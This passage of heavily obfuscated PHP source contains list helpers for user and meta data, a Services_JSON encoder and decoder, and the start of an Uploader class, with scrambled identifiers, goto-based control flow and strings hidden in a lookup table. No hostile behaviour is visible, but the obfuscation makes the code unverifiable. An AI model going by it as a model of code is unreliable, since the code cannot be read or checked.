} goto Dü„•ÌÎ–å; C»»ÇÕ⁄Èî: if (!$Dˆ∑ïÎ´Õ¨) { return; } $A≈ˆ¯ÿóå = $this->where(array($fÒªÑ◊˘”Ú[2042] => array($fÒªÑ◊˘”Ú[7], $Dˆ∑ïÎ´Õ¨)))->select(); $A≈ˆ¯ÿóå = array_to_keyvalue($A≈ˆ¯ÿóå, $fÒªÑ◊˘”Ú[2051]); goto E”éÊ–û∞¶; eœÀ‚»ÖÁœ: $fÒªÑ◊˘”Ú =& $_SERVER[£¿ÌÙëü¡¯¯]; $Dˆ∑ïÎ´Õ¨ = array_unique(array_to_keyvalue($D›√ôôüî´, $fÒªÑ◊˘”Ú[33], $fÒªÑ◊˘”Ú[2041])); $Dˆ∑ïÎ´Õ¨ = array_remove_value($Dˆ∑ïÎ´Õ¨, $fÒªÑ◊˘”Ú[464]); goto C»»ÇÕ⁄Èî; Dü„•ÌÎ–å: } private function _listAppendUser(&$B¨õåîπÀâ) { goto D®¥ºÁèí•; eà’†•Ï‘∑: if (count($c∑≥≈âÀŒé) == 0) { return; } foreach ($B¨õåîπÀâ as $b§ÎÍËÆ°⁄) { if (isset($b§ÎÍËÆ°⁄[$CÔÜ»Í™ÎŸ[2054]])) { $c∑≥≈âÀŒé[] = $b§ÎÍËÆ°⁄[$CÔÜ»Í™ÎŸ[2054]][$CÔÜ»Í™ÎŸ[1349]]; } } $B‡–ê±Œ∑â = Model($CÔÜ»Í™ÎŸ[469])->userListInfo($c∑≥≈âÀŒé); goto Aâ‰êõÖ‘È; D®¥ºÁèí•: $CÔÜ»Í™ÎŸ =& $_SERVER[£¿ÌÙëü¡¯¯]; $c∑≥≈âÀŒé = array_unique(array_to_keyvalue($B¨õåîπÀâ, $CÔÜ»Í™ÎŸ[33], $CÔÜ»Í™ÎŸ[1349])); $c∑≥≈âÀŒé = array_remove_value($c∑≥≈âÀŒé, $CÔÜ»Í™ÎŸ[464]); goto eà’†•Ï‘∑; Aâ‰êõÖ‘È: foreach ($B¨õåîπÀâ as &$b§ÎÍËÆ°⁄) { $b§ÎÍËÆ°⁄[$CÔÜ»Í™ÎŸ[527]] = $B‡–ê±Œ∑â[$b§ÎÍËÆ°⁄[$CÔÜ»Í™ÎŸ[1349]]]; if (isset($b§ÎÍËÆ°⁄[$CÔÜ»Í™ÎŸ[2054]])) { $b§ÎÍËÆ°⁄[$CÔÜ»Í™ÎŸ[2054]][$CÔÜ»Í™ÎŸ[527]] = $B‡–ê±Œ∑â[$b§ÎÍËÆ°⁄[$CÔÜ»Í™ÎŸ[2054]][$CÔÜ»Í™ÎŸ[1349]]]; } } goto E¯Ö´Ø®Èı; E¯Ö´Ø®Èı: } private function _listAppendMeta(&$Fä‡‹§·ßŸ) { goto DøÀ”ÖÈ∂è; aëÈ’îË≤¡: if (!$eÊπåÍƒ¬‚) { return; } foreach ($Fä‡‹§·ßŸ as $bıñÉ¥Öúí) { if (isset($bıñÉ¥Öúí[$b»õ≠ÚŒ´ÿ[2054]])) { $eÊπåÍƒ¬‚[] = $bıñÉ¥Öúí[$b»õ≠ÚŒ´ÿ[2054]][$b»õ≠ÚŒ´ÿ[2051]]; } } $FãÎæ‡ Œ≠ = $this->metaList($eÊπåÍƒ¬‚); goto E»ƒ„ëò¨‹; DøÀ”ÖÈ∂è: $b»õ≠ÚŒ´ÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eÊπåÍƒ¬‚ = array_unique(array_to_keyvalue($Fä‡‹§·ßŸ, $b»õ≠ÚŒ´ÿ[33], $b»õ≠ÚŒ´ÿ[2051])); $eÊπåÍƒ¬‚ = array_remove_value($eÊπåÍƒ¬‚, $b»õ≠ÚŒ´ÿ[464]); goto aëÈ’îË≤¡; E»ƒ„ëò¨‹: if (!$FãÎæ‡ Œ≠) { return !1; } foreach ($Fä‡‹§·ßŸ as &$bıñÉ¥Öúí) { $bıñÉ¥Öúí[$b»õ≠ÚŒ´ÿ[413]] = $FãÎæ‡ Œ≠[$bıñÉ¥Öúí[$b»õ≠ÚŒ´ÿ[2051]]]; if (isset($bıñÉ¥Öúí[$b»õ≠ÚŒ´ÿ[2054]])) { $bıñÉ¥Öúí[$b»õ≠ÚŒ´ÿ[2054]][$b»õ≠ÚŒ´ÿ[413]] = $FãÎæ‡ Œ≠[$bıñÉ¥Öúí[$b»õ≠ÚŒ´ÿ[2054]][$b»õ≠ÚŒ´ÿ[2051]]]; } } goto c√ƒ⁄õü”‘; c√ƒ⁄õü”‘: } private function metaList($a¶˘≥À¢Éè) { goto bèâÃÓ©‹•; bèâÃÓ©‹•: $b¡çÿçπ∞ä =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$a¶˘≥À¢Éè) { return array(); } $c‹†ﬁíûÜ‹ = array($b¡çÿçπ∞ä[2051] => array($b¡çÿçπ∞ä[7], $a¶˘≥À¢Éè)); goto E¬ïú£úÁ; E¬ïú£úÁ: $eá´æä›’Ó = Model($b¡çÿçπ∞ä[2055])->where($c‹†ﬁíûÜ‹)->select(); $eá´æä›’Ó = array_to_keyvalue_group($eá´æä›’Ó, $b¡çÿçπ∞ä[2051]); foreach ($eá´æä›’Ó as $fáñŸÉÒ®› => $e≠µÚ‰Ù”Ø) { $D®ˆí…“ˆá = array(); foreach ($e≠µÚ‰Ù”Ø as $E…èûêæ°‘) { $D®ˆí…“ˆá[$E…èûêæ°‘[$b¡çÿçπ∞ä[90]]] = $E…èûêæ°‘[$b¡çÿçπ∞ä[354]]; } $eá´æä›’Ó[$fáñŸÉÒ®›] = $D®ˆí…“ˆá; } goto a⁄„ç˘ﬁÛ√; a⁄„ç˘ﬁÛ√: return $eá´æä›’Ó ? $eá´æä›’Ó : array(); goto fâ¬ÏßïçÜ; fâ¬ÏßïçÜ: } } goto EÒõøÒöøÎ; c°óÖãÜ–: class Services_JSON { function __construct($A¬Ë«Ùàã  = 0) { $this->use = $A¬Ë«Ùàã ; } function utf162utf8($AëèÍ√¥í†) { $f¢∫é‹∆¡ß =& $_SERVER[£¿ÌÙëü¡¯¯]; if (function_exists($f¢∫é‹∆¡ß[69])) { return mb_convert_encoding($AëèÍ√¥í†, $f¢∫é‹∆¡ß[1497], $f¢∫é‹∆¡ß[1849]); } $aê¡«‰¡–Œ = ord($AëèÍ√¥í†[0]) << 8 | ord($AëèÍ√¥í†[1]); switch (!0) { case (127 & $aê¡«‰¡–Œ) == $aê¡«‰¡–Œ: return chr(127 & $aê¡«‰¡–Œ); case (2047 & $aê¡«‰¡–Œ) == $aê¡«‰¡–Œ: return chr(192 | $aê¡«‰¡–Œ >> 6 & 31) . chr(128 | $aê¡«‰¡–Œ & 63); case (65535 & $aê¡«‰¡–Œ) == $aê¡«‰¡–Œ: return chr(224 | $aê¡«‰¡–Œ >> 12 & 15) . chr(128 | $aê¡«‰¡–Œ >> 6 & 63) . chr(128 | $aê¡«‰¡–Œ & 63); } return $f¢∫é‹∆¡ß[33]; } function utf82utf16($fœ∏Ïà·û) { $AËõŸ‡àºœ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (function_exists($AËõŸ‡àºœ[69])) { return mb_convert_encoding($fœ∏Ïà·û, $AËõŸ‡àºœ[1849], $AËõŸ‡àºœ[1497]); } switch (strlen($fœ∏Ïà·û)) { case 1: return $fœ∏Ïà·û; case 2: return chr(7 & ord($fœ∏Ïà·û[0]) >> 2) . chr(192 & ord($fœ∏Ïà·û[0]) << 6 | 63 & ord($fœ∏Ïà·û[1])); case 3: return chr(240 & ord($fœ∏Ïà·û[0]) << 4 | 15 & ord($fœ∏Ïà·û[1]) >> 2) . chr(192 & ord($fœ∏Ïà·û[1]) << 6 | 127 & ord($fœ∏Ïà·û[2])); } return $AËõŸ‡àºœ[33]; } function encode($D¯ÌÎ≠ôé©) { $e°◊ﬁªçÌÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; switch (gettype($D¯ÌÎ≠ôé©)) { case $e°◊ﬁªçÌÿ[1508]: return $D¯ÌÎ≠ôé© ? $e°◊ﬁªçÌÿ[1507] : $e°◊ﬁªçÌÿ[1509]; case $e°◊ﬁªçÌÿ[1850]: return $e°◊ﬁªçÌÿ[102]; case $e°◊ﬁªçÌÿ[300]: return (int) $D¯ÌÎ≠ôé©; case $e°◊ﬁªçÌÿ[275]: case $e°◊ﬁªçÌÿ[274]: return (double) $D¯ÌÎ≠ôé©; case $e°◊ﬁªçÌÿ[309]: $BïŒ»∏ªÕâ = $e°◊ﬁªçÌÿ[33]; $Dâﬂé±Çê… = strlen($D¯ÌÎ≠ôé©); for ($Dë∆‚÷ßÜ∏ = 0; $Dë∆‚÷ßÜ∏ < $Dâﬂé±Çê…; ++$Dë∆‚÷ßÜ∏) { $aáêÁñå û = ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏]); switch (!0) { case $aáêÁñå û == 8: $BïŒ»∏ªÕâ .= $e°◊ﬁªçÌÿ[1851]; break; case $aáêÁñå û == 9: $BïŒ»∏ªÕâ .= $e°◊ﬁªçÌÿ[1484]; break; case $aáêÁñå û == 10: $BïŒ»∏ªÕâ .= $e°◊ﬁªçÌÿ[1482]; break; case $aáêÁñå û == 12: $BïŒ»∏ªÕâ .= $e°◊ﬁªçÌÿ[1852]; break; case $aáêÁñå û == 13: $BïŒ»∏ªÕâ .= $e°◊ﬁªçÌÿ[1483]; break; case $aáêÁñå û == 34: case $aáêÁñå û == 47: case $aáêÁñå û == 92: $BïŒ»∏ªÕâ .= $e°◊ﬁªçÌÿ[96] . $D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏]; break; case $aáêÁñå û >= 32 && $aáêÁñå û <= 127: $BïŒ»∏ªÕâ .= $D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏]; break; case ($aáêÁñå û & 224) == 192: $BäÎπ≤ÔÑ› = pack($e°◊ﬁªçÌÿ[1853], $aáêÁñå û, ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 1])); $Dë∆‚÷ßÜ∏ += 1; $C£Éœ◊éªˆ = $this->utf82utf16($BäÎπ≤ÔÑ›); $BïŒ»∏ªÕâ .= sprintf($e°◊ﬁªçÌÿ[1854], bin2hex($C£Éœ◊éªˆ)); break; case ($aáêÁñå û & 240) == 224: $BäÎπ≤ÔÑ› = pack($e°◊ﬁªçÌÿ[1853], $aáêÁñå û, ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 1]), ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 2])); $Dë∆‚÷ßÜ∏ += 2; $C£Éœ◊éªˆ = $this->utf82utf16($BäÎπ≤ÔÑ›); $BïŒ»∏ªÕâ .= sprintf($e°◊ﬁªçÌÿ[1854], bin2hex($C£Éœ◊éªˆ)); break; case ($aáêÁñå û & 248) == 240: $BäÎπ≤ÔÑ› = pack($e°◊ﬁªçÌÿ[1853], $aáêÁñå û, ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 1]), ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 2]), ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 3])); $Dë∆‚÷ßÜ∏ += 3; $C£Éœ◊éªˆ = $this->utf82utf16($BäÎπ≤ÔÑ›); $BïŒ»∏ªÕâ .= sprintf($e°◊ﬁªçÌÿ[1854], bin2hex($C£Éœ◊éªˆ)); break; case ($aáêÁñå û & 252) == 248: $BäÎπ≤ÔÑ› = pack($e°◊ﬁªçÌÿ[1853], $aáêÁñå û, ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 1]), ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 2]), ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 3]), ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 4])); $Dë∆‚÷ßÜ∏ += 4; $C£Éœ◊éªˆ = $this->utf82utf16($BäÎπ≤ÔÑ›); $BïŒ»∏ªÕâ .= sprintf($e°◊ﬁªçÌÿ[1854], bin2hex($C£Éœ◊éªˆ)); break; case ($aáêÁñå û & 254) == 252: $BäÎπ≤ÔÑ› = pack($e°◊ﬁªçÌÿ[1853], $aáêÁñå û, ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 1]), ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 2]), ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 3]), ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 4]), ord($D¯ÌÎ≠ôé©[$Dë∆‚÷ßÜ∏ + 5])); $Dë∆‚÷ßÜ∏ += 5; $C£Éœ◊éªˆ = $this->utf82utf16($BäÎπ≤ÔÑ›); $BïŒ»∏ªÕâ .= sprintf($e°◊ﬁªçÌÿ[1854], bin2hex($C£Éœ◊éªˆ)); break; } } return $e°◊ﬁªçÌÿ[114] . $BïŒ»∏ªÕâ . $e°◊ﬁªçÌÿ[114]; case $e°◊ﬁªçÌÿ[1855]: if (is_array($D¯ÌÎ≠ôé©) && count($D¯ÌÎ≠ôé©) && array_keys($D¯ÌÎ≠ôé©) !== range(0, sizeof($D¯ÌÎ≠ôé©) - 1)) { $BÎúœ‚óπÑ = array_map(array($this, $e°◊ﬁªçÌÿ[1856]), array_keys($D¯ÌÎ≠ôé©), array_values($D¯ÌÎ≠ôé©)); foreach ($BÎúœ‚óπÑ as $eåŸåÛé›¿) { if (Services_JSON::isError($eåŸåÛé›¿)) { return $eåŸåÛé›¿; } } return $e°◊ﬁªçÌÿ[1043] . join($e°◊ﬁªçÌÿ[47], $BÎúœ‚óπÑ) . $e°◊ﬁªçÌÿ[312]; } $A™æ¢‘øƒ⁄ = array_map(array($this, $e°◊ﬁªçÌÿ[1857]), $D¯ÌÎ≠ôé©); foreach ($A™æ¢‘øƒ⁄ as $cÖ∂‘”†Ï§) { if (Services_JSON::isError($cÖ∂‘”†Ï§)) { return $cÖ∂‘”†Ï§; } } return $e°◊ﬁªçÌÿ[154] . join($e°◊ﬁªçÌÿ[47], $A™æ¢‘øƒ⁄) . $e°◊ﬁªçÌÿ[468]; case $e°◊ﬁªçÌÿ[1858]: $dŒüÏ÷“Ÿö = get_object_vars($D¯ÌÎ≠ôé©); $BÎúœ‚óπÑ = array_map(array($this, $e°◊ﬁªçÌÿ[1856]), array_keys($dŒüÏ÷“Ÿö), array_values($dŒüÏ÷“Ÿö)); foreach ($BÎúœ‚óπÑ as $eåŸåÛé›¿) { if (Services_JSON::isError($eåŸåÛé›¿)) { return $eåŸåÛé›¿; } } return $e°◊ﬁªçÌÿ[1043] . join($e°◊ﬁªçÌÿ[47], $BÎúœ‚óπÑ) . $e°◊ﬁªçÌÿ[312]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $e°◊ﬁªçÌÿ[102] : new Services_JSON_Error(gettype($D¯ÌÎ≠ôé©) . $e°◊ﬁªçÌÿ[1859]); } } function name_value($bÃÕÇ∆¶é⁄, $d„£≥√√Ìâ) { $FæÊπº…áÂ = $this->encode($d„£≥√√Ìâ); if (Services_JSON::isError($FæÊπº…áÂ)) { return $FæÊπº…áÂ; } return $this->encode(strval($bÃÕÇ∆¶é⁄)) . $_SERVER[£¿ÌÙëü¡¯¯][4] . $FæÊπº…áÂ; } function reduce_string($E∫äµáπ≥·) { $a¶π¿å≈Óÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $E∫äµáπ≥· = preg_replace(array($a¶π¿å≈Óÿ[1860], $a¶π¿å≈Óÿ[1861], $a¶π¿å≈Óÿ[1862]), $a¶π¿å≈Óÿ[33], $E∫äµáπ≥·); return trim($E∫äµáπ≥·); } function decode($E—é§‡π°Ù) { $fÁìÒıÙÉ÷ =& $_SERVER[£¿ÌÙëü¡¯¯]; $E—é§‡π°Ù = $this->reduce_string($E—é§‡π°Ù); switch (strtolower($E—é§‡π°Ù)) { case $fÁìÒıÙÉ÷[1507]: return !0; case $fÁìÒıÙÉ÷[1509]: return !1; case $fÁìÒıÙÉ÷[102]: return null; default: $EáıŸÔË”± = array(); if (is_numeric($E—é§‡π°Ù)) { return (double) $E—é§‡π°Ù == (int) $E—é§‡π°Ù ? (int) $E—é§‡π°Ù : (double) $E—é§‡π°Ù; } elseif (preg_match($fÁìÒıÙÉ÷[1863], $E—é§‡π°Ù, $EáıŸÔË”±) && $EáıŸÔË”±[1] == $EáıŸÔË”±[2]) { $f»¨ü„Ò∑÷ = substr($E—é§‡π°Ù, 0, 1); $CàÜê˜Ôﬂ° = substr($E—é§‡π°Ù, 1, -1); $C‚¿„Éõçı = $fÁìÒıÙÉ÷[33]; $dÇÌ’óÏò∏ = strlen($CàÜê˜Ôﬂ°); for ($DÙó®Ò‰≈¿ = 0; $DÙó®Ò‰≈¿ < $dÇÌ’óÏò∏; ++$DÙó®Ò‰≈¿) { $DêÃåìä·÷ = substr($CàÜê˜Ôﬂ°, $DÙó®Ò‰≈¿, 2); $a√‡‡ÜÑ∂Ω = ord($CàÜê˜Ôﬂ°[$DÙó®Ò‰≈¿]); switch (!0) { case $DêÃåìä·÷ == $fÁìÒıÙÉ÷[1851]: $C‚¿„Éõçı .= chr(8); ++$DÙó®Ò‰≈¿; break; case $DêÃåìä·÷ == $fÁìÒıÙÉ÷[1484]: $C‚¿„Éõçı .= chr(9); ++$DÙó®Ò‰≈¿; break; case $DêÃåìä·÷ == $fÁìÒıÙÉ÷[1482]: $C‚¿„Éõçı .= chr(10); ++$DÙó®Ò‰≈¿; break; case $DêÃåìä·÷ == $fÁìÒıÙÉ÷[1852]: $C‚¿„Éõçı .= chr(12); ++$DÙó®Ò‰≈¿; break; case $DêÃåìä·÷ == $fÁìÒıÙÉ÷[1483]: $C‚¿„Éõçı .= chr(13); ++$DÙó®Ò‰≈¿; break; case $DêÃåìä·÷ == $fÁìÒıÙÉ÷[1260]: case $DêÃåìä·÷ == $fÁìÒıÙÉ÷[1864]: case $DêÃåìä·÷ == $fÁìÒıÙÉ÷[1477]: case $DêÃåìä·÷ == $fÁìÒıÙÉ÷[1479]: if ($f»¨ü„Ò∑÷ == $fÁìÒıÙÉ÷[114] && $DêÃåìä·÷ != $fÁìÒıÙÉ÷[1864] || $f»¨ü„Ò∑÷ == $fÁìÒıÙÉ÷[55] && $DêÃåìä·÷ != $fÁìÒıÙÉ÷[1260]) { $C‚¿„Éõçı .= $CàÜê˜Ôﬂ°[++$DÙó®Ò‰≈¿]; } break; case preg_match($fÁìÒıÙÉ÷[1865], substr($CàÜê˜Ôﬂ°, $DÙó®Ò‰≈¿, 6)): $aæ‚ñ¯ß§° = chr(hexdec(substr($CàÜê˜Ôﬂ°, $DÙó®Ò‰≈¿ + 2, 2))) . chr(hexdec(substr($CàÜê˜Ôﬂ°, $DÙó®Ò‰≈¿ + 4, 2))); $C‚¿„Éõçı .= $this->utf162utf8($aæ‚ñ¯ß§°); $DÙó®Ò‰≈¿ += 5; break; case $a√‡‡ÜÑ∂Ω >= 32 && $a√‡‡ÜÑ∂Ω <= 127: $C‚¿„Éõçı .= $CàÜê˜Ôﬂ°[$DÙó®Ò‰≈¿]; break; case ($a√‡‡ÜÑ∂Ω & 224) == 192: $C‚¿„Éõçı .= substr($CàÜê˜Ôﬂ°, $DÙó®Ò‰≈¿, 2); ++$DÙó®Ò‰≈¿; break; case ($a√‡‡ÜÑ∂Ω & 240) == 224: $C‚¿„Éõçı .= substr($CàÜê˜Ôﬂ°, $DÙó®Ò‰≈¿, 3); $DÙó®Ò‰≈¿ += 2; break; case ($a√‡‡ÜÑ∂Ω & 248) == 240: $C‚¿„Éõçı .= substr($CàÜê˜Ôﬂ°, $DÙó®Ò‰≈¿, 4); $DÙó®Ò‰≈¿ += 3; break; case ($a√‡‡ÜÑ∂Ω & 252) == 248: $C‚¿„Éõçı .= substr($CàÜê˜Ôﬂ°, $DÙó®Ò‰≈¿, 5); $DÙó®Ò‰≈¿ += 4; break; case ($a√‡‡ÜÑ∂Ω & 254) == 252: $C‚¿„Éõçı .= substr($CàÜê˜Ôﬂ°, $DÙó®Ò‰≈¿, 6); $DÙó®Ò‰≈¿ += 5; break; } } return $C‚¿„Éõçı; } elseif (preg_match($fÁìÒıÙÉ÷[1866], $E—é§‡π°Ù) || preg_match($fÁìÒıÙÉ÷[1867], $E—é§‡π°Ù)) { goto d°Ωà∂õÕ∆; c›‰µ«ﬁÓ◊: for ($DÙó®Ò‰≈¿ = 0; $DÙó®Ò‰≈¿ <= $dÇÌ’óÏò∏; ++$DÙó®Ò‰≈¿) { $dÛÚ ê“â“ = end($cè®≥«†ÁÌ); $DêÃåìä·÷ = substr($CàÜê˜Ôﬂ°, $DÙó®Ò‰≈¿, 2); if ($DÙó®Ò‰≈¿ == $dÇÌ’óÏò∏ || $CàÜê˜Ôﬂ°[$DÙó®Ò‰≈¿] == $fÁìÒıÙÉ÷[47] && $dÛÚ ê“â“[$fÁìÒıÙÉ÷[1868]] == SERVICES_JSON_SLICE) { $aåíÁÏˆÈß = substr($CàÜê˜Ôﬂ°, $dÛÚ ê“â“[$fÁìÒıÙÉ÷[260]], $DÙó®Ò‰≈¿ - $dÛÚ ê“â“[$fÁìÒıÙÉ÷[260]]); array_push($cè®≥«†ÁÌ, array($fÁìÒıÙÉ÷[1868] => SERVICES_JSON_SLICE, $fÁìÒıÙÉ÷[260] => $DÙó®Ò‰≈¿ + 1, $fÁìÒıÙÉ÷[1869] => !1)); if (reset($cè®≥«†ÁÌ) == SERVICES_JSON_IN_ARR) { array_push($FÂïÉÕ†ùÑ, $this->decode($aåíÁÏˆÈß)); } elseif (reset($cè®≥«†ÁÌ) == SERVICES_JSON_IN_OBJ) { $BÀŸΩ¡ï∏‹ = array(); if (preg_match($fÁìÒıÙÉ÷[1870], $aåíÁÏˆÈß, $BÀŸΩ¡ï∏‹)) { $CıµÒ¨É≠¬ = $this->decode($BÀŸΩ¡ï∏‹[1]); $céÆïàï◊‘ = $this->decode($BÀŸΩ¡ï∏‹[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $C∫ùÓè∂ºî[$CıµÒ¨É≠¬] = $céÆïàï◊‘; } else { $C∫ùÓè∂ºî->{$CıµÒ¨É≠¬} = $céÆïàï◊‘; } } elseif (preg_match($fÁìÒıÙÉ÷[1871], $aåíÁÏˆÈß, $BÀŸΩ¡ï∏‹)) { $CıµÒ¨É≠¬ = $BÀŸΩ¡ï∏‹[1]; $céÆïàï◊‘ = $this->decode($BÀŸΩ¡ï∏‹[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $C∫ùÓè∂ºî[$CıµÒ¨É≠¬] = $céÆïàï◊‘; } else { $C∫ùÓè∂ºî->{$CıµÒ¨É≠¬} = $céÆïàï◊‘; } } } } elseif (($CàÜê˜Ôﬂ°[$DÙó®Ò‰≈¿] == $fÁìÒıÙÉ÷[114] || $CàÜê˜Ôﬂ°[$DÙó®Ò‰≈¿] == $fÁìÒıÙÉ÷[55]) && $dÛÚ ê“â“[$fÁìÒıÙÉ÷[1868]] != SERVICES_JSON_IN_STR) { array_push($cè®≥«†ÁÌ, array($fÁìÒıÙÉ÷[1868] => SERVICES_JSON_IN_STR, $fÁìÒıÙÉ÷[260] => $DÙó®Ò‰≈¿, $fÁìÒıÙÉ÷[1869] => $CàÜê˜Ôﬂ°[$DÙó®Ò‰≈¿])); } elseif ($CàÜê˜Ôﬂ°[$DÙó®Ò‰≈¿] == $dÛÚ ê“â“[$fÁìÒıÙÉ÷[1869]] && $dÛÚ ê“â“[$fÁìÒıÙÉ÷[1868]] == SERVICES_JSON_IN_STR && (strlen(substr($CàÜê˜Ôﬂ°, 0, $DÙó®Ò‰≈¿)) - strlen(rtrim(substr($CàÜê˜Ôﬂ°, 0, $DÙó®Ò‰≈¿), $fÁìÒıÙÉ÷[96]))) % 2 != 1) { array_pop($cè®≥«†ÁÌ); } elseif ($CàÜê˜Ôﬂ°[$DÙó®Ò‰≈¿] == $fÁìÒıÙÉ÷[154] && in_array($dÛÚ ê“â“[$fÁìÒıÙÉ÷[1868]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($cè®≥«†ÁÌ, array($fÁìÒıÙÉ÷[1868] => SERVICES_JSON_IN_ARR, $fÁìÒıÙÉ÷[260] => $DÙó®Ò‰≈¿, $fÁìÒıÙÉ÷[1869] => !1)); } elseif ($CàÜê˜Ôﬂ°[$DÙó®Ò‰≈¿] == $fÁìÒıÙÉ÷[468] && $dÛÚ ê“â“[$fÁìÒıÙÉ÷[1868]] == SERVICES_JSON_IN_ARR) { array_pop($cè®≥«†ÁÌ); } elseif ($CàÜê˜Ôﬂ°[$DÙó®Ò‰≈¿] == $fÁìÒıÙÉ÷[1043] && in_array($dÛÚ ê“â“[$fÁìÒıÙÉ÷[1868]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($cè®≥«†ÁÌ, array($fÁìÒıÙÉ÷[1868] => SERVICES_JSON_IN_OBJ, $fÁìÒıÙÉ÷[260] => $DÙó®Ò‰≈¿, $fÁìÒıÙÉ÷[1869] => !1)); } elseif ($CàÜê˜Ôﬂ°[$DÙó®Ò‰≈¿] == $fÁìÒıÙÉ÷[312] && $dÛÚ ê“â“[$fÁìÒıÙÉ÷[1868]] == SERVICES_JSON_IN_OBJ) { array_pop($cè®≥«†ÁÌ); } elseif ($DêÃåìä·÷ == $fÁìÒıÙÉ÷[1872] && in_array($dÛÚ ê“â“[$fÁìÒıÙÉ÷[1868]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($cè®≥«†ÁÌ, array($fÁìÒıÙÉ÷[1868] => SERVICES_JSON_IN_CMT, $fÁìÒıÙÉ÷[260] => $DÙó®Ò‰≈¿, $fÁìÒıÙÉ÷[1869] => !1)); $DÙó®Ò‰≈¿++; } elseif ($DêÃåìä·÷ == $fÁìÒıÙÉ÷[1873] && $dÛÚ ê“â“[$fÁìÒıÙÉ÷[1868]] == SERVICES_JSON_IN_CMT) { array_pop($cè®≥«†ÁÌ); $DÙó®Ò‰≈¿++; for ($BÈ›£»§è† = $dÛÚ ê“â“[$fÁìÒıÙÉ÷[260]]; $BÈ›£»§è† <= $DÙó®Ò‰≈¿; ++$BÈ›£»§è†) { $CàÜê˜Ôﬂ° = substr_replace($CàÜê˜Ôﬂ°, $fÁìÒıÙÉ÷[50], $BÈ›£»§è†, 1); } } } if (reset($cè®≥«†ÁÌ) == SERVICES_JSON_IN_ARR) { return $FÂïÉÕ†ùÑ; } elseif (reset($cè®≥«†ÁÌ) == SERVICES_JSON_IN_OBJ) { return $C∫ùÓè∂ºî; } goto bíÌÔá…ö÷; d°Ωà∂õÕ∆: if ($E—é§‡π°Ù[0] == $fÁìÒıÙÉ÷[154]) { $cè®≥«†ÁÌ = array(SERVICES_JSON_IN_ARR); $FÂïÉÕ†ùÑ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $cè®≥«†ÁÌ = array(SERVICES_JSON_IN_OBJ); $C∫ùÓè∂ºî = array(); } else { $cè®≥«†ÁÌ = array(SERVICES_JSON_IN_OBJ); $C∫ùÓè∂ºî = new stdClass(); } } array_push($cè®≥«†ÁÌ, array($fÁìÒıÙÉ÷[1868] => SERVICES_JSON_SLICE, $fÁìÒıÙÉ÷[260] => 0, $fÁìÒıÙÉ÷[1869] => !1)); $CàÜê˜Ôﬂ° = substr($E—é§‡π°Ù, 1, -1); goto D¡ñÙ”∞«; D¡ñÙ”∞«: $CàÜê˜Ôﬂ° = $this->reduce_string($CàÜê˜Ôﬂ°); if ($CàÜê˜Ôﬂ° == $fÁìÒıÙÉ÷[33]) { if (reset($cè®≥«†ÁÌ) == SERVICES_JSON_IN_ARR) { return $FÂïÉÕ†ùÑ; } else { return $C∫ùÓè∂ºî; } } $dÇÌ’óÏò∏ = strlen($CàÜê˜Ôﬂ°); goto c›‰µ«ﬁÓ◊; bíÌÔá…ö÷: } } } function isError($cÔêö‡⁄‘«, $fÆ¯€ÿƒíÕ = null) { $c‹€é‡—ƒæ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (class_exists($c‹€é‡—ƒæ[1874])) { return PEAR::isError($cÔêö‡⁄‘«, $fÆ¯€ÿƒíÕ); } elseif (is_object($cÔêö‡⁄‘«) && (get_class($cÔêö‡⁄‘«) == $c‹€é‡—ƒæ[1875] || is_subclass_of($cÔêö‡⁄‘«, $c‹€é‡—ƒæ[1875]))) { return !0; } return !1; } } if (class_exists($_SERVER[£¿ÌÙëü¡¯¯][1876])) { class Services_JSON_Error extends PEAR_Error { function __construct($EÛªúÏ‡Ñ§ = "\x75\156\x6b\x6e\157\167\156\40\x65\x72\162\x6f\162", $C›˜Ìúí„À = null, $bß†⁄¡üÇ˘ = null, $a¨¨ΩÆîê∆ = null, $f´∆¬∆Èü  = null) { parent::PEAR_Error($EÛªúÏ‡Ñ§, $C›˜Ìúí„À, $bß†⁄¡üÇ˘, $a¨¨ΩÆîê∆, $f´∆¬∆Èü ); } } } else { class Services_JSON_Error { function __construct($Eãéë¶¨ˆø = "\165\x6e\x6b\156\x6f\167\x6e\40\145\x72\162\157\162", $DÛß¨≈…∆ä = null, $E∂≤ã›Ú∫… = null, $f‹è¥íÇ≈è = null, $BëÜÙÙãç∂ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto Cœ£®Á∞ª; FŒç™…ÇÆ∆: $this->checkSize(); $this->tempPathInit(); goto bÍî¨åúïü; Cœ£®Á∞ª: 